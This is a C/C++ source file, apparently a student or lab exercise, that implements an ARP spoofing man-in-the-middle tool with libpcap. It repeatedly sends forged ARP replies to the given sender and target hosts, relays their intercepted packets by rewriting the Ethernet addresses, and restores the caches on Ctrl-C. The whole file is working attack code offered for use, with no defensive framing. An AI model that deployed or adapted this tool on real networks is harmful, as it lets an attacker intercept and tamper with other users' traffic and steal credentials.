#include "arp_spoof.h"
#include <signal.h>

char *dev;
char errbuf[1000];

pcap_t *handle;
struct spoofTarget *spoofList;
struct Address attacker;
int slen;

static volatile int isStop = 0;

void interL(int d) {
	isStop = 1;
}

void preserve() {
	while(!isStop) {
		for (int i = 0 ; i < slen ; i++) {
			sendARP(handle, spoofList + i, &attacker);
		}
		sleep(5);
	}
}

int main(int argc, char *argv[]) {
	assert(argc > 3, "Not enough arguments : bin (interface) (sender IP 1) (target IP 1) [(sender IP 2) (target IP 2) ..]");
	assert (!(argc & 1), "Argument missmatch : target IP should be exist");
	
	dev = argv[1];
	handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
	assert(handle != NULL, "Cannot open interface");
	
	getMacAddr(&attacker, dev);
	getIpAddr(&attacker, dev);


	slen = argc / 2 - 1;
	spoofList = (struct spoofTarget *)malloc(slen * sizeof(struct spoofTarget));
	for (int i = 0 ; i < slen ; i++) {
		assert(inet_aton(argv[i*2+2], (in_addr *)(spoofList[i].sender.IP)) > 0, "Parsing sender ip failed");
		assert(inet_aton(argv[i*2+3], (in_addr *)(spoofList[i].target.IP)) > 0, "Parsing target ip failed");
		getHWaddr(handle, &(spoofList[i].sender), &attacker);
		getHWaddr(handle, &(spoofList[i].target), &attacker);
	}

	printf("Attacker Information\n");
	printf("  IP Address\t: "); printIp(&attacker); printf("\n");
	printf("  MAC Address\t: "); printMac(&attacker); printf("\n");

	printf("ARP spoofing Target\n");
	for (int i = 0 ; i < slen ; i++) {
		printf("  [%d]\t from : ", i + 1); printIp(&(spoofList[i].sender)); printf("("); printMac(&(spoofList[i].sender)); printf(")\n");
		printf("\t   to : "); printIp(&(spoofList[i].target)); printf("("); printMac(&(spoofList[i].target)); printf(")\n");
	}

	std::thread pr (preserve);
	signal(SIGINT, interL);

	printf("Enter Ctrl-C to interrupt program.\n");
	
	const u_char *pkt;
	struct pcap_pkthdr *hdr;
	while(!isStop) {
		if(!load(handle, &hdr, &pkt)) break;
		if (isARP(pkt)) {
			for (int i = 0 ; i < slen ; i++) {
				sendARP(handle, spoofList + i, &attacker);
			}
		} else {
			if (memcmp((void *)(pkt + 0), attacker.MAC, 6)) continue;
			struct spoofTarget *t = NULL;
			for (int i = 0 ; i < slen ; i++) {
				if (!memcmp((void *)(pkt + 6), spoofList[i].sender.MAC, 6)) {
					t = spoofList + i;
					break;
				}
			}

			if (t == NULL) continue;
			memcpy((void *)(pkt + 6), attacker.MAC, 6);
			memcpy((void *)(pkt + 0), t->target.MAC, 6); 
			pcap_sendpacket(handle, pkt, hdr->len);
		}
	}

	printf("\n\nInterrupt Detected.\n");
	for (int i = 0 ; i < slen ; i++) {
		sendARP(handle, spoofList + i, &(spoofList[i].target));
	}
	free(spoofList);	
}



